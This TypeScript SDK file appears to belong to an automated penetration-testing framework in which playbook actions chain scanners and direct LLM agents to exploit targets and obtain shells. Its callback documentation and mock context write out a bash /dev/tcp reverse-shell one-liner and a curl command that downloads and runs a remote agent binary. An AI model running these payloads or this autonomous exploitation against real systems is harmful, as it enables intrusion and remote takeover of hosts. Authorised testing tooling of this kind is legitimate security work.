/**
 * PK Playbook SDK
 *
 * Playbooks are TypeScript modules exporting {@link Action} arrays. The supervisor
 * evaluates each action's {@link Action.on | on} trigger when an event arrives and
 * calls {@link Action.run | run} with a {@link RunContext} for matches.
 *
 * Shared steps are regular functions that accept a {@link RunContext}; import them
 * from `actions/shared/`.
 *
 * @example
 * ```ts
 * import type { Action } from "@promptkiddie/core";
 * import { webFingerprint } from "@promptkiddie/core";
 *
 * const myAction: Action = {
 *   name: "web_recon",
 *   on: (e) => e.type === "PortDiscovered" && e.payload.service === "http",
 *   tier: "auto",
 *   emits: ["VersionIdentified"],
 *   async run(ctx) {
 *     await webFingerprint(ctx, ctx.event.payload.port as number);
 *   },
 * };
 *
 * export default [myAction];
 * ```
 *
 * @example Testing
 * ```ts
 * import { createMockContext } from "@promptkiddie/core";
 *
 * const ctx = createMockContext({
 *   target: "10.0.0.1",
 *   event: { type: "PortDiscovered", payload: { port: 80, service: "http" } },
 *   execResults: { whatweb: { stdout: '{}', stderr: "", code: 0, durationMs: 50 } },
 * });
 * await myAction.run(ctx);
 * expect(ctx.emitted).toHaveLength(1);
 * ```
 *
 * @packageDocumentation
 */

/** An event produced by tools, actions, or the supervisor. Immutable, append-only. */
export interface EngagementEvent {
  /** Unique event ID (UUID). */
  id: string;
  /**
   * Event type. Standard types: `EngagementStarted`, `PortDiscovered`,
   * `VersionIdentified`, `HostnameFound`, `FileDownloaded`, `FindingAdded`,
   * `CredentialFound`, `ShellObtained`, `FlagCaptured`, `ExploitAvailable`,
   * `PathDiscovered`, `StallDetected`.
   */
  type: string;
  /** Event-specific structured data. Shape depends on {@link type}. */
  payload: Record<string, unknown>;
  /** What produced this event (e.g. `"rustscan"`, `"agent:recon"`, `"cli"`). */
  source: string;
  /** Engagement this event belongs to. */
  engagementId: string;
  /** When the event was created. */
  createdAt: Date;
}

/** Read-only snapshot of the current engagement state. */
export interface EngagementState {
  id: string;
  name: string;
  /** `"ctf"`, `"whitebox"`, `"blackbox"`, or `"bugbounty"`. */
  type: string;
  /** Primary in-scope target identifier. */
  target: string;
  /** Current methodology phase. */
  phase: string;
  /** Execution mode: `"race"`, `"standard"`, `"methodical"`, or `"learning"`. */
  mode: string;
}

/** Options for {@link RunContext.exec}. */
export interface ExecOpts {
  /** Stream raw output to the terminal in real time. Default: `false`. */
  stream?: boolean;
  /** Command timeout in milliseconds. Default: `300000` (5 min). */
  timeout?: number;
  /** Max bytes returned to the caller. Full output is always stored in DB. */
  maxOutput?: number;
}

/** Result of a command executed via {@link RunContext.exec}. */
export interface ExecResult {
  stdout: string;
  stderr: string;
  /** Process exit code. `0` = success. */
  code: number;
  /** Wall-clock execution time. */
  durationMs: number;
}

/** A CVE match from the local exploit index. */
export interface ExploitHit {
  /** CVE identifier (e.g. `"CVE-2025-55182"`). */
  cve: string;
  /** Product name as listed in the index. */
  product: string;
  /** Affected version range (semver, e.g. `">=13.0.0 <15.1.0"`). */
  affected: string;
  cvss: number;
  severity: string;
  /** Path to vendored PoC script, if available. */
  pocPath?: string;
  /** Where the exploit card came from. */
  source: string;
}

/** A result from the knowledge base vector/keyword search. */
export interface KnowledgeResult {
  content: string;
  source: string;
  score: number;
}

/** Options for {@link RunContext.spawnLlm}. */
export interface LlmOpts {
  /** Agent type to spawn (e.g. `"exploit-agent"`, `"general-purpose"`). */
  agentType?: string;
  /** Task priority. Lower = higher priority. Default: `50`. */
  priority?: number;
  /** Model override (e.g. `"opus"`, `"sonnet"`). Default: inherited. */
  model?: string;
}

/**
 * LLM runner configuration for prompt-based actions.
 *
 * When an action has a {@link Action.prompt} field, the supervisor sends it to
 * Cartridge. This config controls how.
 */
export interface LlmRunner {
  /** Agent type (e.g. `"exploit-agent"`). Default: `"general-purpose"`. */
  agent?: string;
  /** Model override. Default: inherited from engagement/global config. */
  model?: string;
  /** Scheduling priority. Lower = runs first. Default: `50`. */
  priority?: number;
  /**
   * Session strategy.
   * - `"persistent"` (default): reuses a long-lived Cartridge session. Cheaper
   *   for short focused tasks (no boot cost after first call).
   * - `"fresh"`: new session per invocation. Clean context, better for long-running
   *   exploitation chains where accumulated context matters.
   */
  session?: "persistent" | "fresh";
}

/** Options for requesting a callback listener via {@link RunContext.callback}. */
export interface CallbackOpts {
  /** Listener mode. Default: `"raw"`. */
  mode?: "agent" | "raw" | "http";
  /** Specific port to use. `0` or omitted means auto-allocate. */
  port?: number;
}

/** Connection info returned by {@link RunContext.callback}. */
export interface CallbackInfo {
  /** Routable IP the target should connect to (tun0 or equivalent). */
  ip: string;
  /** Port the listener is bound to. */
  port: number;
  /** Listener mode. */
  mode: string;
  /** Ready-to-use reverse shell one-liner for the target. */
  oneliner: string;
}

/**
 * Execution context passed to every {@link Action.run} call. Provides all
 * interaction with the engagement: run commands, emit events, search knowledge,
 * delegate to LLMs.
 *
 * The supervisor creates a real context; tests use {@link createMockContext}.
 */
export interface RunContext {
  /** Primary in-scope target (e.g. `"10.129.45.196"`). */
  target: string;
  /** The event that triggered this action. */
  event: EngagementEvent;
  /** Current engagement state snapshot. */
  engagement: EngagementState;

  /**
   * Run a command in the attackbox container. Raw output is stored in DB
   * and optionally streamed to the terminal. Returns structured result.
   *
   * @example
   * ```ts
   * const result = await ctx.exec("rustscan", ["-a", ctx.target, "--", "-sV"], { stream: true });
   * if (result.code === 0) { ... }
   * ```
   */
  exec(tool: string, args: string[], opts?: ExecOpts): Promise<ExecResult>;

  /**
   * Emit an event to the engagement event bus. Downstream actions whose
   * {@link Action.on | on} trigger matches will fire.
   *
   * @example
   * ```ts
   * await ctx.emit("PortDiscovered", { port: 80, service: "http", version: "nginx 1.28.0" });
   * ```
   */
  emit(type: string, payload: Record<string, unknown>): Promise<void>;

  /**
   * Search the local exploit index for CVEs matching a product+version.
   * Returns hits with PoC paths when available.
   */
  searchExploitIndex(product: string, version: string): Promise<ExploitHit[]>;

  /**
   * Search the knowledge base (techniques + exploit cards) via hybrid
   * vector + keyword search.
   */
  searchKnowledge(query: string): Promise<KnowledgeResult[]>;

  /**
   * Shift another action's priority. Lower numbers run first. Use when a
   * discovery makes some work more or less urgent.
   *
   * @example
   * ```ts
   * // Source code found; directory brute-force is less important now
   * ctx.reprioritize("dir_brute", 80);
   * ```
   */
  reprioritize(actionName: string, newPriority: number): void;

  /**
   * Spawn an LLM agent for a judgment task. The agent receives the
   * full engagement context payload automatically. Returns the agent's
   * final text response.
   *
   * @example
   * ```ts
   * const analysis = await ctx.spawnLlm(
   *   `Analyze ${path} for injection vulnerabilities.\nGrep hits:\n${grep.stdout}`,
   *   { agentType: "exploit-agent", priority: 1 }
   * );
   * ```
   */
  spawnLlm(task: string, opts?: LlmOpts): Promise<string>;

  /**
   * Record a discovery: something learned about the engagement. Discoveries
   * persist in the DB and are included in LLM context payloads.
   *
   * @param type - `"positive"` (leads to more work), `"negative"` (dead end),
   *   or `"attempted"` (tried and failed, don't retry).
   * @param category - Grouping key (e.g. `"port"`, `"web"`, `"cve"`, `"privesc"`).
   * @param summary - Human-readable one-liner.
   * @param detail - Optional structured data.
   */
  discover(type: "positive" | "negative" | "attempted", category: string, summary: string, detail?: Record<string, unknown>): Promise<void>;

  /**
   * Register a file as engagement evidence (hashed and linked in DB).
   *
   * @example
   * ```ts
   * await ctx.evidence("exec/rustscan-output.txt", "scan");
   * ```
   */
  evidence(path: string, type: "screenshot" | "scan" | "output" | "file" | "flag"): Promise<void>;

  /** Read a file from the engagement directory or attackbox filesystem. */
  readFile(path: string): Promise<string>;

  /** Log a progress message (visible in the Agent Log UI tab). */
  log(message: string): void;

  /**
   * Request a callback listener from gleipnir. Opens a listener on the relay
   * and returns connection info the target can use to connect back.
   *
   * @example
   * ```ts
   * const cb = await ctx.callback({ mode: "raw" });
   * // cb.ip = "10.10.14.81", cb.port = 9001
   * // cb.oneliner = "bash -c 'bash -i >& /dev/tcp/10.10.14.81/9001 0>&1'"
   * await ctx.exec("curl", [vulnUrl, "-d", cb.oneliner]);
   * ```
   */
  callback(opts?: CallbackOpts): Promise<CallbackInfo>;
}

/**
 * A playbook action. The core building block.
 *
 * The supervisor evaluates {@link on} against each incoming event. When it
 * returns `true`, the action fires. What happens depends on which fields
 * are set:
 *
 * | `run` | `prompt` | Behavior |
 * |-------|----------|----------|
 * | yes   | no       | **Script.** Supervisor calls `run()` directly. |
 * | no    | yes      | **Agent.** Supervisor sends `prompt` + context to Cartridge. |
 * | yes   | yes      | **Both.** Supervisor calls `run()` first, then sends `prompt`. |
 *
 * @example Script action (auto-tier)
 * ```ts
 * const portScan: Action = {
 *   name: "port_scan",
 *   on: (e) => e.type === "EngagementStarted",
 *   emits: ["PortDiscovered"],
 *   async run(ctx) {
 *     const result = await ctx.exec("rustscan", ["-a", ctx.target, "--", "-sV"]);
 *     // parse and emit...
 *   },
 * };
 * ```
 *
 * @example Prompt action (agent-tier)
 * ```ts
 * const exploit: Action = {
 *   name: "exploit",
 *   on: (e) => e.type === "FindingAdded" && e.payload.severity === "critical",
 *   emits: ["ShellObtained"],
 *   prompt: "Exploit this finding and get a shell.",
 *   llm: { agent: "exploit-agent", model: "opus", session: "fresh" },
 * };
 * ```
 *
 * @example Both (script + agent)
 * ```ts
 * const cveSearch: Action = {
 *   name: "cve_search",
 *   on: (e) => e.type === "VersionIdentified",
 *   emits: ["ExploitAvailable"],
 *   prompt: "Search web for CVEs and PoC exploits for {product} {version}.",
 *   async run(ctx) {
 *     await ctx.exec("searchsploit", [ctx.event.payload.product, ctx.event.payload.version]);
 *   },
 * };
 * ```
 */
export interface Action {
  /** Unique action name. Used for priority management and graph visualization. */
  name: string;
  /** Human-readable description. Shown in the UI and used by LLMs writing playbooks. */
  description?: string;
  /**
   * Trigger predicate. Called for every event; return `true` to fire this action.
   * Keep this fast and side-effect-free.
   */
  on: (event: EngagementEvent) => boolean;
  /**
   * Script handler. Receives a {@link RunContext} with methods for exec, emit,
   * LLM delegation, and discovery logging. The supervisor calls this when
   * {@link on} returns `true`.
   *
   * If both `run` and `prompt` are set, `run` executes first (auto-tier work),
   * then `prompt` is sent to Cartridge (LLM judgment).
   */
  run?: (ctx: RunContext) => Promise<void>;
  /**
   * LLM task prompt. When set, the supervisor sends this string + the structured
   * engagement context to a Cartridge agent session. Template variables like
   * `{target}`, `{product}`, `{version}` are interpolated from the event payload.
   *
   * The agent uses PK's MCP tools to emit events, add findings, and log
   * discoveries. Results flow back through the event system.
   */
  prompt?: string;
  /**
   * LLM runner configuration. Only used when {@link prompt} is set.
   * @see {@link LlmRunner}
   */
  llm?: LlmRunner;
  /**
   * Event types this action may emit. Used to build the visualization graph.
   * Not enforced at runtime; treat as documentation that stays close to the code.
   */
  emits?: string[];
  /**
   * Docker image override for this action. When set, the supervisor uses this
   * image instead of the playbook default. Useful when a specific action needs
   * heavier tooling (e.g. metasploit for exploit, or a custom image with
   * domain-specific tools).
   */
  image?: string;
}

/** Playbook metadata controlling how the supervisor runs it. */
export interface PlaybookMeta {
  /** Default Docker image for all actions. Default: "pk-agent". */
  image?: string;
  /** Engagement types this playbook is designed for. */
  engagementTypes?: Array<"ctf" | "whitebox" | "blackbox" | "bugbounty">;
  /** Execution mode hint. */
  mode?: "race" | "standard" | "methodical" | "learning";
  /** Docker network to attach containers to. Default: "pk-network". */
  network?: string;
  /** Model for the orchestrator LLM. Default: global PK_MODEL or provider default. */
  orchestratorModel?: string;
}

/** A playbook is a named collection of actions with optional runtime metadata. */
export interface Playbook {
  name: string;
  description: string;
  actions: Action[];
  meta?: PlaybookMeta;
}

/** A mock exec result with optional delay and failure behavior. */
export interface MockExecEntry extends ExecResult {
  /** Simulated delay in ms before returning. Scaled by {@link MockContextOpts.timeScale}. */
  delay?: number;
  /** If true, the exec call throws an Error instead of returning. */
  throws?: boolean;
}

/** Map of tool name or full command to mock exec result, for testing. */
export interface MockExecMap {
  [command: string]: MockExecEntry;
}

/** A recorded exec call for test assertions. */
export interface ExecCall {
  tool: string;
  args: string[];
  opts?: ExecOpts;
  timestamp: number;
}

/** Options for {@link createMockContext}. */
export interface MockContextOpts {
  target?: string;
  event?: Partial<EngagementEvent>;
  engagement?: Partial<EngagementState>;
  /** Pre-configured exec results. Keyed by tool name or full command string. */
  execResults?: MockExecMap;
  /**
   * Time scale factor for mock delays.
   * - `0` (default): all delays resolve instantly
   * - `1`: real-time delays (use for timing tests)
   * - `0.01`: 100x faster (1s delay becomes 10ms)
   */
  timeScale?: number;
}

/**
 * Extended {@link RunContext} that records all interactions for test assertions.
 * Created by {@link createMockContext}.
 */
export interface MockContext extends RunContext {
  /** Events emitted via {@link RunContext.emit}. */
  emitted: Array<{ type: string; payload: Record<string, unknown> }>;
  /** Discoveries recorded via {@link RunContext.discover}. */
  discoveries: Array<{ type: string; category: string; summary: string; detail?: Record<string, unknown> }>;
  /** Evidence files registered via {@link RunContext.evidence}. */
  evidenceFiles: Array<{ path: string; type: string }>;
  /** Messages logged via {@link RunContext.log}. */
  logs: string[];
  /** Priority changes via {@link RunContext.reprioritize}. */
  reprioritized: Array<{ name: string; priority: number }>;
  /** LLM tasks spawned via {@link RunContext.spawnLlm}. */
  llmCalls: Array<{ task: string; opts?: LlmOpts }>;
  /** Files read via {@link RunContext.readFile}. */
  filesRead: string[];
  /** Every exec() call with tool, args, opts, and timestamp. */
  execCalls: ExecCall[];
  /** The exec results map (mutable, so tests can update mid-run). */
  execResults: MockExecMap;
  /** Callback requests recorded via {@link RunContext.callback}. */
  callbackRequests: CallbackOpts[];
}

/**
 * Create a mock {@link RunContext} for unit testing actions without a live
 * database, Docker, or network.
 *
 * @example
 * ```ts
 * const ctx = createMockContext({
 *   target: "10.0.0.1",
 *   event: { type: "PortDiscovered", payload: { port: 80, service: "http" } },
 *   execResults: {
 *     whatweb: { stdout: '{"target":"http://10.0.0.1"}', stderr: "", code: 0, durationMs: 50 },
 *   },
 * });
 * await myAction.run(ctx);
 * expect(ctx.emitted).toContainEqual({ type: "VersionIdentified", payload: expect.any(Object) });
 * ```
 */
export function createMockContext(opts: MockContextOpts = {}): MockContext {
  const emitted: MockContext["emitted"] = [];
  const discoveries: MockContext["discoveries"] = [];
  const evidenceFiles: MockContext["evidenceFiles"] = [];
  const logs: string[] = [];
  const reprioritized: MockContext["reprioritized"] = [];
  const llmCalls: MockContext["llmCalls"] = [];
  const filesRead: string[] = [];
  const execCalls: ExecCall[] = [];
  const execResults: MockExecMap = { ...opts.execResults };
  const callbackRequests: CallbackOpts[] = [];
  const timeScale = opts.timeScale ?? 0;

  const event: EngagementEvent = {
    id: "mock-event-id",
    type: opts.event?.type ?? "EngagementStarted",
    payload: opts.event?.payload ?? {},
    source: opts.event?.source ?? "mock",
    engagementId: opts.engagement?.id ?? "mock-engagement-id",
    createdAt: new Date(),
    ...opts.event,
  };

  const engagement: EngagementState = {
    id: "mock-engagement-id",
    name: "Mock Engagement",
    type: "ctf",
    target: opts.target ?? "10.0.0.1",
    phase: "recon",
    mode: "standard",
    ...opts.engagement,
  };

  return {
    target: opts.target ?? "10.0.0.1",
    event,
    engagement,
    emitted,
    discoveries,
    evidenceFiles,
    logs,
    reprioritized,
    llmCalls,
    filesRead,
    execCalls,
    execResults,
    callbackRequests,

    async exec(tool, args, execOpts) {
      const call: ExecCall = { tool, args: [...args], opts: execOpts, timestamp: Date.now() };
      execCalls.push(call);

      const cmd = `${tool} ${args.join(" ")}`;
      const match = execResults[tool] ?? execResults[cmd];
      if (!match) {
        return { stdout: "", stderr: `mock: ${cmd} not configured`, code: 1, durationMs: 0 };
      }

      if (match.delay && timeScale > 0) {
        await new Promise((r) => setTimeout(r, match.delay! * timeScale));
      }

      if (match.throws) {
        throw new Error(`mock exec failed: ${cmd}`);
      }

      return { stdout: match.stdout, stderr: match.stderr, code: match.code, durationMs: match.durationMs };
    },

    async emit(type, payload) {
      emitted.push({ type, payload });
    },

    async searchExploitIndex(_product, _version) {
      return [];
    },

    async searchKnowledge(_query) {
      return [];
    },

    reprioritize(name, priority) {
      reprioritized.push({ name, priority });
    },

    async spawnLlm(task, llmOpts) {
      llmCalls.push({ task, opts: llmOpts });
      return "mock-llm-response";
    },

    async discover(type, category, summary, detail) {
      discoveries.push({ type, category, summary, detail });
    },

    async evidence(path, type) {
      evidenceFiles.push({ path, type });
    },

    async readFile(path) {
      filesRead.push(path);
      return `mock file content for ${path}`;
    },

    log(message) {
      logs.push(message);
    },

    async callback(cbOpts) {
      callbackRequests.push(cbOpts ?? {});
      const mode = cbOpts?.mode ?? "raw";
      const port = cbOpts?.port ?? 9001;
      const ip = "10.10.14.1";
      let oneliner: string;
      if (mode === "agent") {
        oneliner = `curl http://${ip}:6666/api/agents/linux/amd64 -o /tmp/agent && chmod +x /tmp/agent && /tmp/agent -H ${ip} -p ${port}`;
      } else {
        oneliner = `bash -c 'bash -i >& /dev/tcp/${ip}/${port} 0>&1'`;
      }
      return { ip, port, mode, oneliner };
    },
  };
}
